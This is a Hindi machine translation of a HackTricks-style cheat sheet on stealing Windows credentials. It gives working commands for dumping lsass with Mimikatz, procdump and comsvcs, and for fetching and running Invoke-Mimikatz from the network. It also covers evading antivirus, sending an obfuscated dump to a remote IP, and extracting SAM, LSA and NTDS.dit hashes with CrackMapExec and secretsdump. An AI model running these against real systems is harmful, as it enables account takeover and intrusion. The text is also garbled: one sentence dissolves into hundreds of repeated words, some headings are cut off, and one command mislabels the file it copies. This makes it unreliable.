# Windows Credentials चुराना

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PR जमा करके।

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**इस पेज में** [**इस पेज**](credentials-mimikatz.md)** में Mimikatz कर सकता है अन्य चीजें ढूंढें।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**यहाँ कुछ संभावित प्रमाणपत्र संरक्षण के बारे में जानें।**](credentials-protections.md) **यह संरक्षण कुछ प्रमाणपत्रों को निकालने से मिमीकैट्ज़ को रोक सकता है।**

## Meterpreter के साथ प्रमाणपत्र

उस [**प्रमाणपत्र प्लगइन**](https://github.com/carlospolop/MSF-Credentials) **का उपयोग करें जिसे** मैंने बनाया है **जिसका उपयोग करके शिकार में से पासवर्ड और हैश खोजें।**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को छलना

### Procdump + Mimikatz

जैसा कि **SysInternals** का **Procdump** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft उपकरण है**, इसे Defender द्वारा पहचाना नहीं जाता है।\
आप इस उपकरण का उपयोग करके **lsass प्रक्रिया को डंप कर सकते हैं**, **डंप डाउनलोड कर सकते हैं** और **डंप से स्थानीय रूप से प्रमाणों को निकाल सकते हैं।

{% code title="lsass का डंप" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="डंप से क्रेडेंशियल्स निकालें" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**ध्यान दें**: कुछ **AV** कुछ **हानिकारक** मान सकते हैं कि **procdump.exe का उपयोग lsass.exe को डंप करने** के लिए, यह इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** स्ट्रिंग को **पहचान** रहे हैं। इसलिए **lsass.exe का PID** procdump को **नाम lsass.exe के बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **बजाय** **
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)** के साथ स्वचालित कर सकते हैं।**

### **कार्य प्रबंधक के साथ lsass का डंपिंग**

1. कार्य पट्टी पर दायाँ क्लिक करें और कार्य प्रबंधक पर क्लिक करें
2. अधिक विवरण पर क्लिक करें
3. प्रक्रियाओं टैब में "स्थानीय सुरक्षा प्राधिकरण प्रक्रिया" प्रक्रिया की खोज करें
4. "स्थानीय सुरक्षा प्राधिकरण प्रक्रिया" प्रक्रिया पर दायाँ क्लिक करें और "डंप फ़ाइल बनाएं" पर क्लिक करें।

### procdump के साथ lsass का डंपिंग

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक Microsoft साइन किया गया बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सुइट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass को डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक सुरक्षित प्रक्रिया डंपिंग टूल है जो मेमोरी डंप को अस्पष्ट करने और इसे डिस्क पर न गिराते हुए रिमोट वर्कस्टेशन पर ट्रांसफर करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL सुरक्षा को छलकरना
2. Defender हस्ताक्षर-आधारित पहचान प्रक्रियाओं से बचने के लिए मेमोरी डंप फ़ाइलों को अस्पष्ट करना
3. डिस्क पर न गिराते हुए (फाइललेस डंप) RAW और SMB अपलोड विधियों के साथ मेमोरी डंप अपलोड करना
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAM हैश डंप
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA रहस्यों को डंप करें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्ष्य DC से NTDS.dit डंप करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्ष्य DC से NTDS.dit पासवर्ड हिस्ट्री डंप करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet विशेषता दिखाएं
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM और SYSTEM चुराना

ये फ़ाइलें **स्थित होनी चाहिए** _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ लेकिन **आप उन्हें साधारित तरीके से कॉपी नहीं कर सकते** क्योंकि वे सुरक्षित हैं।

### रजिस्ट्री से

इन फ़ाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**वे फ़ाइलें** अपनी Kali मशीन पर डाउनलोड करें और निम्नलिखित का उपयोग करके **हैश निकालें**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### वॉल्यूम शैडो कॉपी

आप इस सेवा का उपयोग करके सुरक्षित फ़ाइलों की प्रतिलिपि बना सकते हैं। आपको व्यवस्थापक होना चाहिए।

#### vssadmin का उपयोग

vssadmin बाइनरी केवल Windows सर्वर संस्करणों में ही उपलब्ध है
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप इसे **पावरशेल** से भी कर सकते हैं। यहाँ एक उदाहरण है **कि कैसे SAM फ़ाइल की प्रतिलिपि बनाई जाए** (इस्तेमाल किया गया हार्ड ड्राइव "C:" है और यह C:\users\Public में सहेजी जाती है) लेकिन आप इसे किसी भी संरक्षित फ़ाइल की प्रतिलिपि बनाने के लिए इस्तेमाल कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

अंत में, आप भी [**PS स्क्रिप्ट Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग कर सकते हैं SAM, SYSTEM और ntds.dit की एक कॉपी बनाने के लिए।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **एक्टिव डायरेक्टरी क्रेडेंशियल्स - NTDS.dit**

**NTDS.dit** फ़ाइल को **एक्टिव डायरेक्टरी** का ह्रदय माना जाता है, जिसमें उपयोगकर्ता ऑब्जेक्ट्स, समूह और उनकी सदस्यता के बारे में महत्वपूर्ण डेटा होता है। यहाँ डोमेन उपयोगकर्ताओं के **पासवर्ड हैश** संग्रहित होते हैं। यह फ़ाइल एक **एक्सटेंसिबल स्टोरेज इंजन (ESE)** डेटाबेस है और **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित है।

इस डेटाबेस में, तीन प्रमुख तालिकाएँ बनाए रखी गई हैं:

- **डेटा तालिका**: यह तालिका उपयोगकर्ताओं और समूह जैसे ऑब्ज
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप यहाँ [**वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) ट्रिक का उपयोग कर सकते हैं **ntds.dit** फ़ाइल की कॉपी करने के लिए। ध्यान रखें कि आपको **SYSTEM फ़ाइल** की भी एक कॉपी की आवश्यकता होगी (फिर से, [**रजिस्ट्री से डंप करें या वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) ट्रिक का उपयोग करें)।

### **NTDS.dit से हैश निकालना**

जब आपने **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** कर ली होंगी, तो आप _secretsdump.py_ जैसे उपकरणों का उपयोग करके **हैश निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप उन्हें स्वचालित रूप से भी **निकाल सकते हैं** एक मान्य डोमेन व्यवस्थापक उपयोगकर्ता का उपयोग करके:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**बड़े NTDS.dit फ़ाइलों** के लिए इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके निकालना सुझाव दिया जाता है।

अंत में, आप **metasploit मॉड्यूल** का भी उपयोग कर सकते हैं: _post/windows/gather/credentials/domain\_hashdump_ या **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit से डोमेन ऑब्ज
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` हाइव वैकल्पिक है लेकिन इसकी अनुमति सीक्रेट्स डिक्रिप्शन के लिए है (एनटी और एलएम हैश, सप्लीमेंटल क्रेडेंशियल्स जैसे क्लियरटेक्स्ट पासवर्ड, केरबेरोस या ट्रस्ट की, एनटी और एलएम पासवर्ड हिस्ट्री।) इसके साथ ही, निम्नलिखित डेटा निकाला जाता है: उपयोगकर्ता और मशीन खाते उनके हैश के साथ, यूएसी फ्लैग्स, अंतिम लॉगऑन और पासवर्ड बदलने के लिए समयचिह्न, खातों का विवरण, नाम, यूपीएन, एसपीएन, समूह और रिकर्सिव सदस्यता, संगठनात्मक इकाइयों का पेड़ और सदस्यता, विश्वसनीय डोमेन जो ट्रस्ट के प्रकार, दिशा और विशेषताओं के साथ।

## Lazagne

[यहाँ से](https://github.com/AlessandroZ/LaZagne/releases) बाइनरी डाउनलोड करें। आप इस बाइनरी का उपयोग कई सॉफ़्टवेयर से क्रेडेंशियल्स निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से क्रेडेंशियल निकालने के लिए अन्य उपकरण

### Windows credentials Editor (WCE)

यह उपकरण मेमोरी से क्रेडेंशियल निकालने के लिए उपयोग किया जा सकता है। इसे यहाँ से डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फ़ाइल से क्रेडेंशियल निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से क्रेडेंशियल निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से डाउनलोड करें: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) और बस **इसे execute करें** और पासवर्ड निकाल लिए जाएंगे।

## रक्षा

[**कुछ credentials सुरक्षा के बारे में जानें।**](credentials-protections.md)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks swag प्राप्त करें**](https://peass.creator-spring.com)
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या हमें **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
